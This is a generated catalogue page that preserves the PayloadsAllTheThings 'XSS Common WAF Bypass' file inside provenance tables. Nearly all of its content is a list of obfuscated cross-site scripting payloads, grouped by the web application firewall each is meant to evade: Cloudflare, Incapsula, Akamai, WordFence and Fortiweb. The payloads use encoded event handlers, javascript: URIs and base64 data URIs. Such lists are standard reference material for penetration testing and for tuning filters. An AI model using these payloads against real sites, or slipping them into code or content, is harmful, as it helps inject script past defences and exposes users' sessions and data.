---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Common WAF Bypass

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xss-injection-3-xss-common-waf-bypass` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/3 - XSS Common WAF Bypass.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Common WAF Bypass](../../topics/xss-injection/common-waf-bypass.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xss-injection-3-xss-common-waf-bypass |
| name | Common WAF Bypass |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md |

## Preserved Source Material

````yaml
_body: "# Common WAF Bypass\n\n> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic\
  \ for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods\
  \ attackers use to obfuscate and modify their payloads to circumvent detection.\n\n## Summary\n\n* [Cloudflare](#cloudflare)\n\
  * [Chrome Auditor](#chrome-auditor)\n* [Incapsula WAF](#incapsula-waf)\n* [Akamai WAF](#akamai-waf)\n* [WordFence WAF](#wordfence-waf)\n\
  * [Fortiweb WAF](#fortiweb-waf)\n\n## Cloudflare\n\n* 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\
  \n    ```js\n    <svg/onrandom=random onload=confirm(1)>\n    <video onnull=null onmouseover=confirm(1)>\n    ```\n\n* 21st\
  \ April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg/OnLoad=\"`${prompt``}`\">\n \
  \   ```\n\n* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg/onload=%26nbsp;alert`bohdan`+\n\
  \    ```\n\n* 5th June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    1'\"><img/src/onerror=.1|alert``>\n\
  \    ```\n\n* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg onload=prompt%26%230000000040document.domain)>\n\
  \    <svg onload=prompt%26%23x000000028;document.domain)>\n    xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\n\
  \    ```\n\n* 22nd March 2019 - @RakeshMane10\n\n    ```js\n    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f\n\
  \    ```\n\n* 27th February 2018\n\n    ```html\n    <a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\"\
  >X</a>\n    ```\n\n## Chrome Auditor\n\nNOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and Chromium\
  \ Browser.\n\n* 9th August 2018\n\n    ```javascript\n    </script><svg><script>alert(1)-%26apos%3B\n    ```\n\n## Incapsula\
  \ WAF\n\n* 11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)\n\n    ```js\n    <svg onload\\\
  r\\n=$.globalEval(\"al\"+\"ert()\");>\n    ```\n\n* 8th March 2018 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)\n\
  \n    ```javascript\n    anythinglr00</script><script>alert(document.domain)</script>uxldz\n    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz\n\
  \    ```\n\n* 11th September 2018 - [@c0d3G33k](https://twitter.com/c0d3G33k)\n\n    ```javascript\n    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>\n\
  \    ```\n\n## Akamai WAF\n\n* 18th June 2018 - [@zseano](https://twitter.com/zseano)\n\n    ```javascript\n    ?\"></script><base%20c%3D=href%3Dhttps:\\\
  mysite>\n    ```\n\n* 28th October 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)\n\n    ```svg\n\
  \    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>\n    ```\n\n## WordFence WAF\n\n* 12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)\n\
  \n    ```html\n    <a href=javas&#99;ript:alert(1)>\n    ```\n\n## Fortiweb WAF\n\n* 9th July 2019 - [@rezaduty](https://twitter.com/rezaduty)\n\
  \n    ```javascript\n    \\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e\n    ```"
_relative_path: XSS Injection/3 - XSS Common WAF Bypass.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/3 - XSS Common WAF Bypass.md
````
